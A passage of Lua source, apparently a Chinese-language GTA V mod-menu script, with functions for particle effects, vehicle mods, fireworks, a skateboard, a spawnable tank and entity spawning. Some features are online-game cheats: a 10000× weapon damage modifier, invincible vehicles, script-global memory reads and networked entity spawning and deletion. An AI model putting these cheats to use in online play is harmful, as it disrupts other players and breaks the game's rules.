                player_pos.x,player_pos.y, player_pos.z, 0, 0, 0,2, false, false, false)
            local player_pos = players.get_position(players.user())
            request_ptfx_asset("scr_sum2_hal")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sum2_hal_rider_weak_orange", 
                player_pos.x,player_pos.y, player_pos.z, 0, 0, 0,2, false, false, false)
            local player_pos = players.get_position(players.user())
            request_ptfx_asset("scr_sum2_hal")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sum2_hal_rider_weak_greyblack", 
                player_pos.x,player_pos.y, player_pos.z,0, 0, 0, 2, false, false, false)
            return ay end) else
       GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped(players.user()))
    end
end
currentModIndex = 0 
increasing = true 
function djveh() -- DJ载具
    wait(10)
        local playerPed = players.user_ped() 
        if PED.IS_PED_IN_ANY_VEHICLE(playerPed, false) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(playerPed, false)
            if increasing then
                currentModIndex = currentModIndex + 1 
                if currentModIndex >= 5 then
                    increasing = false 
                end
            else
                currentModIndex = currentModIndex - 1 
                if currentModIndex < 0 then
                    increasing = true 
                end
            end
        VEHICLE.SET_VEHICLE_MOD(vehicle, 15, currentModIndex) 
    end
end
function KickLeg()
    local isKicking = true
    TASK.TASK_START_SCENARIO_IN_PLACE(
    PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_KICKING", 0, true)
    isKicking = false
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(
    PLAYER.PLAYER_PED_ID())
end
function vehiclefastout() 
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        if PAD.IS_CONTROL_JUST_RELEASED(38, 38) then
            KickLeg()
        end
    else
        notification("你必须在一辆车里.")
    end
end
function Newtank(addon)
    f_on = addon
    if f_on then
        local mypos = ENTITY.GET_ENTITY_COORDS(my_pid())
        local success, groundz = util.get_ground_z(mypos.x, mypos.y)
        if success then
            mypos.z = groundz
        end
        local rot = native_invoker.unified_vector3(my_pid(), 0, 0xAFBD61CC738D9EB9, "ii")
        local dir = rot
        local dir = v3.toDir(native_invoker.unified_vector3(0, 0x837765A25378F0BB, "i"))
        dir = dir
        dir:mul(5)
        request_model(-1881846085)
        request_model(1542143200)
        request_model(util.joaat("apa_prop_flag_china"))
        vehs = entities.create_vehicle(-1881846085, mypos:add(dir), ENTITY.GET_ENTITY_HEADING(my_pid()))
        vehs2 = entities.create_vehicle(1542143200, mypos, 0)
        flag = entities.create_object(util.joaat("apa_prop_flag_china"), players.get_position(players.user()))
        flag2 = entities.create_object(util.joaat("apa_prop_flag_china"), players.get_position(players.user()))
        PED.SET_PED_INTO_VEHICLE(my_pid(), vehs, -1)
        ENTITY.SET_ENTITY_INVINCIBLE(vehs, true)
        ENTITY.SET_ENTITY_INVINCIBLE(vehs2, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehs, vehs2, 0, 0, 0.8, 0.5, 0, 0.0, 0, false, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, vehs2, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehs2, "wheel_lr"), 0, 0, 1.7,
            0, 0.0, 0, false, false, false, true, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(flag2, vehs2, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehs2, "wheel_rr"), 0, 0, 1.7,
            0, 0.0, 0, false, false, false, true, 0, true)
        WEAPON.SET_WEAPON_DAMAGE_MODIFIER(WEAPON.GET_SELECTED_PED_WEAPON(my_pid()), 10000)
        if not VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(entities.get_user_vehicle_as_handle()) and
            TASK.GET_IS_TASK_ACTIVE(my_pid(), 150) then
            PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(my_pid())
        end
    end
    while f_on do
        os.sleep()
        local objPos = ENTITY.GET_ENTITY_COORDS(vehs2, false)
        local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        ENTITY.SET_ENTITY_ROTATION(vehs2, 0, 0, camrot.z, 0, true)
        local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(vehs2)
        forwardV.z = 0.0
        local delta = v3.new(0, 0, 0)
        local speed = 0.15
        if PAD.IS_CONTROL_PRESSED(0, 32) then
            delta = v3.new(forwardV)
            delta:mul(speed)
        end
        if PAD.IS_CONTROL_PRESSED(0, 130) then
            delta = v3.new(forwardV)
            delta:mul(-speed)
        end
        local newPos = v3.new(objPos)
        newPos:add(delta)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehs2, newPos.x, newPos.y, newPos.z, true, true, true, true)
    end
    f_on = false
    WEAPON.SET_WEAPON_DAMAGE_MODIFIER(WEAPON.GET_SELECTED_PED_WEAPON(my_pid()), 1)
    entities.delete_by_handle(vehs)
    entities.delete_by_handle(vehs2)
    entities.delete_by_handle(flag)
    entities.delete_by_handle(flag2)
end
--
ParticleEffect = {}
ParticleEffect.__index = ParticleEffect
function random_color_list()
    local color_list = {"scr_sum2_hal_rider_weak_blue", "scr_sum2_hal_rider_weak_green",
                        "scr_sum2_hal_rider_weak_orange"}
    return color_list
end
function ParticleEffect:new(color_list, asset_name)
    local instance = setmetatable({}, self)
    instance.color_list = color_list
    instance.asset_name = asset_name
    instance.angle = 0.0
    instance.continuous = 0.0
    instance.particle_loaded = false
    return instance
end
function ParticleEffect:load_particle()
    if not self.particle_loaded then
        request_ptfx_asset(self.asset_name)
        self.particle_loaded = true
    end
end
function ParticleEffect:random_color()
    local random_index = math.random(1, #self.color_list)
    return self.color_list[random_index]
end
function ParticleEffect:create_effect(pos)
    self.continuous = self.continuous + 0.05
    self.angle = self.angle + 0.05
    self:load_particle()
    for j = 1, 5 do
        GRAPHICS.USE_PARTICLE_FX_ASSET(self.asset_name)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(self:random_color(), pos.x + math.cos(self.angle),
            pos.y + math.sin(self.angle), pos.z + math.cos(self.continuous * 2) / 5, 0.0, 0.0, 0.0, 0.2, false, false,
            false)
    end
end
local particle_effect = ParticleEffect:new(random_color_list(), "scr_sum2_hal")
function effect_around()
    local mypos = ENTITY.GET_ENTITY_COORDS(my_pid())
    particle_effect:create_effect(mypos)
end
--武器拉扯
function weapon_anim(an)
    if not PED.IS_PED_IN_ANY_VEHICLE(my_pid(), false) then
    tempWep = currentwep
    tempWep2 = current_ped_weapon()
    blocked = true
    if an then
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(my_pid(), tempWep, 2, 1)
        TASK.TASK_PLAY_ANIM(my_pid(), 
        "reaction@intimidation@1h", "intro", 2, 2, -1, 48, 0, false, false, false)
        os.sleep(1250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(my_pid(), tempWep2, 2, 1)
        os.sleep(1250)
    else
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(my_pid(), tempWep, 2, 1)
        TASK.TASK_PLAY_ANIM(my_pid(), 
        "reaction@intimidation@1h", "outro", 2, 2, -1, 48, 0, false, false, false)
        os.sleep(1500)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(my_pid(), rpscript.tempWep2, 2, 1)
    end
        os.sleep(500)
        currentwep = current_ped_weapon()
        blocked = false
        end
    STREAMING.REMOVE_ANIM_DICT("reaction@intimidation@1h")
end
function my_pid()
    rppid = players.user()
    rpped = players.user_ped(rppid)
    return rpped
end
function request_anim(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        os.sleep(0)
    end
end
function current_ped_weapon()
    my_pid()
    currentWpMem = memory.alloc()
    return WEAPON.GET_CURRENT_PED_WEAPON(my_pid(), currentWpMem, 1)
end
--
firework_boxe = {}
function placefireworks()
    local num_boxes = 20
    local radius = 5 
    local center = players.get_position(players.user())  
    local angle_step = 2 * math.pi / num_boxes  
    for i = 1, num_boxes do
        local angle = angle_step * (i - 1)
        local x = center.x + radius * math.cos(angle)
        local y = center.y + radius * math.sin(angle)
        local z = center.z  
        local firework_box = OBJECT.CREATE_OBJECT(util.joaat("ind_prop_firework_03"), x, y, z, true, false, false)
        OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(firework_box)
        firework_boxe[#firework_boxe + 1] = firework_box
        wait(10)
    end
end
function fireworkshows()
    if #firework_boxe == 0 then 
        gtoast("先放烟花！")
        return 
    end
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst"
    request_ptfx_asset(ptfx_asset)
    gtoast("烟花!!!")
    local rainbow_colours = {
        {r = 255, g = 0, b = 0, a = 255},     
        {r = 255, g = 165, b = 0, a = 255},   
        {r = 255, g = 255, b = 0, a = 255}, 
        {r = 0, g = 255, b = 0, a = 255},    
        {r = 0, g = 0, b = 255, a = 255},   
        {r = 75, g = 0, b = 130, a = 255},    
        {r = 238, g = 130, b = 238, a = 255} 
    }
    for i = 1,5 do
        for step = 1, #rainbow_colours - 1 do
            local start_colour = rainbow_colours[step]
            local end_colour = rainbow_colours[step + 1]
            for k, box in pairs(firework_boxe) do 
                local boxcood = ENTITY.GET_ENTITY_COORDS(box, false)
                GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
                local interval = 0
                for j = 0, 5, 1 do
                    local mid_colour = {
                        r = start_colour.r + math.floor((end_colour.r - start_colour.r) * (j / 10)),
                        g = start_colour.g + math.floor((end_colour.g - start_colour.g) * (j / 10)),
                        b = start_colour.b + math.floor((end_colour.b - start_colour.b) * (j / 10)),
                        a = start_colour.a + math.floor((end_colour.a - start_colour.a) * (j / 10))
                    }
                    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(mid_colour.r, mid_colour.g, mid_colour.b)
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(effect_name, boxcood.x, boxcood.y, boxcood.z, 0, 0, 0, 1, false, false, false)
                    wait(interval)
                end
            end
        end
    end
    for k, box in pairs(firework_boxe) do 
        entities.delete_by_handle(box)
        firework_boxe[box] = nil
    end
end
skate = 0
function res_skateboard()
    if skate == 0 then
        local skateboard = joaat("v_res_skateboard")
        local skateboard2 = joaat("prop_big_shit_02")
        request_model(skateboard)
        request_model(skateboard2)
        STREAMING.REQUEST_ANIM_DICT("move_strafe@first_person@drunk")
        while not STREAMING.HAS_ANIM_DICT_LOADED("move_strafe@first_person@drunk") do
            wait()
        end
        localmyPed = players.user_ped()
        respos = ENTITY.GET_ENTITY_COORDS(localmyPed)
        respos.z = respos.z - 1
        hasskateboard = OBJECT.CREATE_OBJECT_NO_OFFSET(skateboard, respos.x, respos.y, respos.z, true, true)
        hasskateboard2 = OBJECT.CREATE_OBJECT_NO_OFFSET(skateboard2, respos.x, respos.y, respos.z, true, true)
        ENTITY.SET_ENTITY_VISIBLE(hasskateboard2, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(localmyPed, hasskateboard2, 0, 0, 0.0, 1.15, 0.0, 0.0, 0.0, false, false, false,
            true, 2, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(hasskateboard, hasskateboard2, 0, 0, 0.0, 0, 0.0, 0.0, 100, false, false, false,
            true, 2, true)
        TASK.TASK_PLAY_ANIM(localmyPed, "move_strafe@first_person@drunk", "idle", 8.0, -8.0, -1, 1, 0.0, false, false,
            false)
        skate = 1
    elseif skate == 1 then
        local objPos = ENTITY.GET_ENTITY_COORDS(hasskateboard2, false)
        local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        ENTITY.SET_ENTITY_ROTATION(hasskateboard2, 0, 0, camrot.z, 0, true)
        local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(localmyPed)
        forwardV.z = 0.0
        local delta = v3.new(0, 0, 0)
        local speed = 0.2
        if PAD.IS_CONTROL_PRESSED(0, 61) then -- Shift
            speed = 1.5
        end
        if PAD.IS_CONTROL_PRESSED(0, 32) then -- W
            delta = v3.new(forwardV)
            delta:mul(speed)
        end
        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then -- 空格
            ENTITY.SET_ENTITY_VELOCITY(hasskateboard2, 0, 0, 5)
        end
        if PAD.GET_CONTROL_NORMAL(0, 36) == 1.0 then -- ctrl
            local rot = 0
            for time = 1, 20 do
                ENTITY.SET_ENTITY_ROTATION(hasskateboard2, 0, 0, rot + time, 1, true)
                rot = rot + 20
                wait(0)
            end
        end
        local newPos = v3.new(objPos)
        newPos:add(delta)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(hasskateboard2, newPos.x, newPos.y, newPos.z, true, true, true, true)
    end
end
function spawned_gunzi() -- 生成金箍棒
    local myobj = 3324004640 -- 棒子
    local mygun = -1810795771 -- 武器:台球棒
    local myuser = players.user()
    local myped = players.user_ped()
    local mypos = ENTITY.GET_ENTITY_COORDS(myped)
    local mybone = PED.GET_PED_BONE_INDEX(myped, 28422)
    local gunzi1 = OBJECT.CREATE_OBJECT(myobj, mypos.x, mypos.y, mypos.z, true, true, false)
    local gunzi2 = OBJECT.CREATE_OBJECT(myobj, mypos.x, mypos.y, mypos.z, true, true, false)
    local gunzi3 = OBJECT.CREATE_OBJECT(myobj, mypos.x, mypos.y, mypos.z, true, true, false)
    local gunzi4 = OBJECT.CREATE_OBJECT(myobj, mypos.x, mypos.y, mypos.z, true, true, false)
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(myuser), mygun, 15, true, true)
    ENTITY.SET_ENTITY_VISIBLE(gunzi1, false, false)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(myped, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(gunzi1, myped, mybone, 0.03, 0, 0, -80, 0.0, 0, true, true, false, true, 0,true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(gunzi2, gunzi1, 0, 0, 0, 0.8, 0, 0.0, 0, true, true, false, true, 0,true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(gunzi3, gunzi1, 0, 0, 0, -0.2, 0, 0.0, 0, true, true, false, true, 0,true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(gunzi4, gunzi1, 0, 0, 0, 0.3, 0, 0.0, 0, true, true, false, true, 0,true)
    WEAPON.SET_WEAPON_DAMAGE_MODIFIER(WEAPON.GET_SELECTED_PED_WEAPON(myped), 10000)
end
function delete_gunzi() -- 删除金箍棒
    local mygun = -1810795771 -- 武器:台球棒
    local myped = players.user_ped()
    WEAPON.REMOVE_WEAPON_FROM_PED(myped, mygun)
    WEAPON.SET_WEAPON_DAMAGE_MODIFIER(WEAPON.GET_SELECTED_PED_WEAPON(myped), 1)
    local a = 0
    for _, e in pairs(entities.get_all_objects_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(e, false, false)
        entities.delete_by_handle(e)
        a = a + 1 os.sleep()
    end
end
Boolean = 0
function moving_tube()
    if Boolean == 0 then
		local objHash = 2193278353
		request_model(objHash)
		request_anim_dict("missfbi3_sniping")
		local localmyPed = players.user_ped()
		local pos = ENTITY.GET_ENTITY_COORDS(localmyPed, false)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(localmyPed)
		loadobject = entities.create_object(objHash, pos)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(localmyPed, loadobject, 
        0, 0, 0, 1.2, 1.0, 1.0,1, false, true, false, false, 0, true, false)
		ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(loadobject, false, false)
		TASK.TASK_PLAY_ANIM(localmyPed, "missfbi3_sniping", "prone_dave",
        8.0, -8.0, -1, 1, 0.0, false, false, false)
		Boolean = 1
	elseif Boolean == 1 then
		local objPos = ENTITY.GET_ENTITY_COORDS(loadobject, false)
		local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
		ENTITY.SET_ENTITY_ROTATION(loadobject, camrot.x, camrot.y, camrot.z, 0, true)
		local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
		forwardV.z = 0.0
		local rightV = v3.new(-forwardV.y, forwardV.x, 0.0) 
		local delta = v3.new(0, 0, 0)
		local speed = 0.2
		if util.is_key_down(0x20) then
			speed = 1.5
		end
        if util.is_key_down(0x45) then
            local inst = v3.new()
            v3.set(inst, CAM.GET_FINAL_RENDERED_CAM_ROT(2))
            local tmp = v3.toDir(inst)
            v3.set(inst, v3.get(tmp))
            v3.mul(inst, 1000)
            v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
            v3.add(inst, tmp)
            local x, y, z = v3.get(inst)
            local fingerPos = ENTITY.GET_ENTITY_COORDS(loadobject, false)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(fingerPos.x, fingerPos.y, fingerPos.z, x, y,
            z, 1, true, util.joaat('vehicle_weapon_tank'), 0, true, false, 500.0, players.user_ped(), 0)
        end
		if util.is_key_down(0x57) then
			delta = v3.new(forwardV)
			delta:mul(speed)
		end
		if util.is_key_down(0x53)  then 
			delta = v3.new(forwardV)
			delta:mul(-speed)
		end
		if util.is_key_down(0x44)  then 
			delta:add(rightV)
			delta:mul(-speed)
		end
		if util.is_key_down(0x41) then 
			delta:add(rightV)
			delta:mul(speed)
		end
		if util.is_key_down(0x44) 
        or util.is_key_down(0x41) then
			delta.z = 0 
		end
		if util.is_key_down(0x10) then 
			delta.z = speed
		end
		if util.is_key_down(0x11) then 
			delta.z = -speed
		end
		local newPos = v3.new(objPos)
		newPos:add(delta)
		ENTITY.SET_ENTITY_COORDS(loadobject, newPos.x, newPos.y, newPos.z,
        false, false, false, false)
	end
end
function draw_centered_box()
    local colors = {
        {1, 0, 1, 1,0, 1, 1, 1}, 
        {0, 1, 1, 1,1, 0, 1, 1},  
        {1, 1, 0, 1,0, 1, 1, 1}  
    }
    for i = 1, 3 do 
        local screen_width = 1 
        local screen_height = 1 
        local box_width = 0.005 * i 
        local box_height = 0.009 * i 
        local box_x = (screen_width - box_width) / 2 
        local box_y = (screen_height - box_height) / 2 
        directx.draw_line(box_x, box_y, box_x + box_width, box_y, table.unpack(colors[i])) 
        directx.draw_line(box_x + box_width, box_y, box_x + box_width, box_y + box_height, table.unpack(colors[i])) 
        directx.draw_line(box_x + box_width, box_y + box_height, box_x, box_y + box_height, table.unpack(colors[i])) 
        directx.draw_line(box_x, box_y + box_height, box_x, box_y, table.unpack(colors[i])) -- 左边
    end
end
try_spawned_entity = {}
tableeVehicleClass = {
        ["契约"] = 0,
        ["轿车"] = 1,
        ["SUV"] = 2,
        ["轿跑"] = 3,
        ["竞技"] = 4,
        ["经典跑车"] = 5,
        ["跑车"] = 6,
        ["超跑"] = 7,
        ["摩托"] = 8,
        ["越野"] = 9,
        ["工业"] = 10,
        ["实用"] = 11,
        ["货车"] = 12,
        ["单车"] = 13,
        ["船"] = 14,
        ["直升机"] = 15,
        ["飞机"] = 16,
        ["服务"] = 17,
        ["紧急"] = 18,
        ["军事"] = 19,
        ["商业"] = 20,
        ["火车"] = 21,
        ["开轮"] = 22,
}
function entity_owner_can_migrate(Entity, Toggle)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Entity), Toggle)
end
function table_remove(table_list, delete)
    local table_delete <const> = {}
    for k, v in pairs(table_list) do
        if v == delete then
            table.insert(table_delete, k)
        end
    end
    table.sort(table_delete, function(a, b)
        return a > b
    end)
    for _, index in ipairs(table_delete) do
        table.remove(table_list, index)
    end
end
local delete_entity_count = 0
function entitydelete_entity(Entity)
    if not PED.IS_PED_A_PLAYER(Entity) and not is_loading() then
        if ENTITY.IS_ENTITY_A_VEHICLE(Entity) then
            for pid in players.list(true, true, true) do
                if is_ped_using_vehicle(PLAYER.PLAYER_PED_ID(pid), Entity) then
                    return
                end
            end
        end
        delete_entity_count = delete_entity_count + 1
        if entities.request_control(Entity, 2000) then
            if ENTITY.IS_ENTITY_ATTACHED(Entity) then
                ENTITY.DETACH_ENTITY(Entity)
            end
            if not ENTITY.IS_ENTITY_ATTACHED(Entity) then
                if ENTITY.IS_ENTITY_A_VEHICLE(Entity) then
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, true)
                elseif ENTITY.IS_ENTITY_AN_OBJECT(Entity) then
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, false, true)
                elseif ENTITY.IS_ENTITY_A_PED(Entity) then
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, false, false)
                end
                util.remove_blip(HUD.GET_BLIP_FROM_ENTITY(Entity))
                entities.delete_by_handle(Entity)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ENTITY.GET_ENTITY_MODEL(Entity))
                table_remove(try_spawned_entity, Entity)
            end
        end
    end
    if delete_entity_count - 10 == 0 then
        delete_entity_count = 0
        wait()
    end
end
function get_rgb(r, g, b, a)
    return
        r
        | (g << 8)
        | (b << 16)
        | ((a or 0) << 24)
end
function random_rgb()
    return get_rgb(math.random(0, 255), math.random(0, 255), math.random(0, 255))
end
function table_contains(table, element, mode)
    for value_1, value_2 in pairs(table) do
        if mode == "left" then
            if value_1 == element then
                return true
            end
        elseif mode == "right" then
            if value_2 == element then
                return true
            end
        end
    end
    return false
end
function get_vehicle_model_name(veh)
	local str = util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(veh))
	if str == "" then
		return nil
	end
	return str
end
performance_mods = {11, 12, 13, 16}
all_vehicle_mods = {}
    for i = 0, 16 do
        if not table_contains(performance_mods, i, "right") then
            all_vehicle_mods[#all_vehicle_mods + 1] = i
        end
    end
    for i = 23, 49 do
        all_vehicle_mods[#all_vehicle_mods + 1] = i
    end
    local vehicle_wheel_types <const> = {}
    for i = 0, 5 do
        vehicle_wheel_types[#vehicle_wheel_types + 1] = i
    end
    for i = 7, 12 do
    vehicle_wheel_types[#vehicle_wheel_types + 1] = i
end
function entityupgrade(Entity, only_perf)
    VEHICLE.SET_VEHICLE_MOD_KIT(Entity, 0)
        if not only_perf then
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(Entity, "tryrun")
            if not VEHICLE.IS_THIS_MODEL_A_BIKE(ENTITY.GET_ENTITY_MODEL(Entity)) then
                VEHICLE.SET_VEHICLE_WHEEL_TYPE(Entity, vehicle_wheel_types[math.random(1, #vehicle_wheel_types)])
            end
            for _, mod in pairs(all_vehicle_mods) do
                if VEHICLE.GET_NUM_VEHICLE_MODS(Entity, mod) > 0 then
                    VEHICLE.SET_VEHICLE_MOD(Entity, mod, math.random(-1, VEHICLE.GET_NUM_VEHICLE_MODS(Entity, mod) - 1))
                end
            end
            for neon_light = 0, 3 do
                VEHICLE.SET_VEHICLE_NEON_ENABLED(Entity, neon_light, math.random(1, 2) == 1)
            end
            VEHICLE.SET_VEHICLE_NEON_COLOUR(Entity, random_rgb())
            VEHICLE.SET_VEHICLE_WINDOW_TINT(Entity, math.random(0, 6))
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(Entity, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(Entity, 22, math.random(1, 3) ~= 1)
            if VEHICLE.IS_TOGGLE_MOD_ON(Entity, 22) then
                VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(Entity, math.random(-1, 12))
            end
            VEHICLE.TOGGLE_VEHICLE_MOD(Entity, 20, math.random(1, 3) ~= 1)
            if VEHICLE.IS_TOGGLE_MOD_ON(Entity, 20) then
                if math.random(1, 3) == 1 then
                    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(Entity, 0, 0, 0)
                else
                    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(Entity, math.random(0, 255), math.random(0, 255), math.random(0, 255))
                end
            end
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(Entity, math.random(0, 5))
            VEHICLE.SET_VEHICLE_MOD_COLOR_1(Entity, math.random(0, 6))
            VEHICLE.SET_VEHICLE_MOD_COLOR_2(Entity, math.random(0, 6))
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(Entity, random_rgb())
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(Entity, random_rgb())
            if not VEHICLE.IS_THIS_MODEL_A_HELI(ENTITY.GET_ENTITY_MODEL(Entity)) and not VEHICLE.IS_THIS_MODEL_A_PLANE(ENTITY.GET_ENTITY_MODEL(Entity)) then
                for extra = 1, 14 do
                    if VEHICLE.DOES_EXTRA_EXIST(Entity, extra) then
                        VEHICLE.SET_VEHICLE_EXTRA(Entity, extra, math.random(1, 2) == 1)
                    end
                end
            end
            if VEHICLE.DOES_VEHICLE_HAVE_WEAPONS(Entity) then
                if VEHICLE.GET_NUM_VEHICLE_MODS(Entity, 10) == 1 then
                    VEHICLE.SET_VEHICLE_MOD(Entity, 10, 0)
                else
                    VEHICLE.SET_VEHICLE_MOD(Entity, 10, 1)
                end
            end
        end
        VEHICLE.TOGGLE_VEHICLE_MOD(Entity, 18, true)
        for _, mod in pairs(performance_mods) do
        VEHICLE.SET_VEHICLE_MOD(Entity, mod, VEHICLE.GET_NUM_VEHICLE_MODS(Entity, mod) - 1)
    end
end
function fix_vehicle(Vehicle)
    FIRE.STOP_ENTITY_FIRE(Vehicle)
    GRAPHICS.REMOVE_DECALS_FROM_VEHICLE(Vehicle)
    ENTITY.SET_ENTITY_RENDER_SCORCHED(Vehicle, false)
    VEHICLE.SET_VEHICLE_BODY_HEALTH(Vehicle, 1000)
    VEHICLE.SET_VEHICLE_DIRT_LEVEL(Vehicle, 0)
    VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(Vehicle, 1000)
    VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(Vehicle)
    VEHICLE.SET_VEHICLE_ENGINE_HEALTH(Vehicle, 1000)
    VEHICLE.SET_VEHICLE_FIXED(Vehicle)
    VEHICLE.SET_VEHICLE_UNDRIVEABLE(Vehicle, false)
end
function entityspawn_entity(hash, pos, dir, can_migrate, invincible, visible, freeze, collision)
    local spawn_entity, entity_type
    request_model(hash)
    local create_ped <const> = entities.create_ped(-1, hash, pos, dir)
    if ENTITY.DOES_ENTITY_EXIST(create_ped) then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(create_ped)
        spawn_entity = create_ped
        entity_type = 1
    else
        local create_vehicle <const> = entities.create_vehicle(hash, pos, dir)
        if ENTITY.DOES_ENTITY_EXIST(create_vehicle) then
            entityupgrade(create_vehicle, false)
            fix_vehicle(create_vehicle)
            spawn_entity = create_vehicle
            entity_type = 2
        else
            local create_object <const> = entities.create_object(hash, pos)
            if ENTITY.DOES_ENTITY_EXIST(create_object) then
                spawn_entity = create_object
                entity_type = 3
            else
                local create_world_object <const> = entities.create_object(hash, pos)
                if ENTITY.DOES_ENTITY_EXIST(create_world_object) then
                    spawn_entity = create_world_object
                    entity_type = 4
                end
            end
        end
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spawn_entity, pos.x,pos.y,pos.z)
    ENTITY.SET_ENTITY_ROTATION(spawn_entity, 0, 0, dir)
    entity_owner_can_migrate(spawn_entity, can_migrate)
    ENTITY.SET_ENTITY_INVINCIBLE(spawn_entity, invincible)
    ENTITY.SET_ENTITY_VISIBLE(spawn_entity, visible)
    if not visible then
		entities.set_can_migrate(spawn_entity, 0)
    end
    if freeze then
        ENTITY.FREEZE_ENTITY_POSITION(spawn_entity, true)
    else
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(spawn_entity, 0, false)
        PHYSICS.ACTIVATE_PHYSICS(spawn_entity)
    end
    ENTITY.SET_ENTITY_COLLISION(spawn_entity, collision, true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    try_spawned_entity[#try_spawned_entity + 1] = spawn_entity
    return spawn_entity, entity_type
end
function is_loading()
    return memory.read_int(memory.script_global(1575008)) ~= 66
end
function startExplosionEffect(aiment, aimpos)
    if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("scr_powerplay") then
        STREAMING.REQUEST_NAMED_PTFX_ASSET("scr_powerplay")
        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("scr_powerplay") do
            wait(0)
        end
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_powerplay")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
    'sp_powerplay_beast_appear_trails', aiment, 0, 0, 1, 0, 0, 0, 5)
end
function rotateAndMoveEntity(aiment)
    local rot = 0
    for time = 1, 100 do
        ENTITY.SET_ENTITY_ROTATION(aiment, 0, 0, rot + time, 1, true)
        ENTITY.SET_ENTITY_VELOCITY(aiment, 0, 0, time)
        rot = rot + 20
        wait()
    end
end
G_GeneratedList = false
function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(menu.my_root(), listName .. " handle " .. handle, {}, "")
        menu.action(lis, "Delete", {}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "Teleport to entity", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(handle)
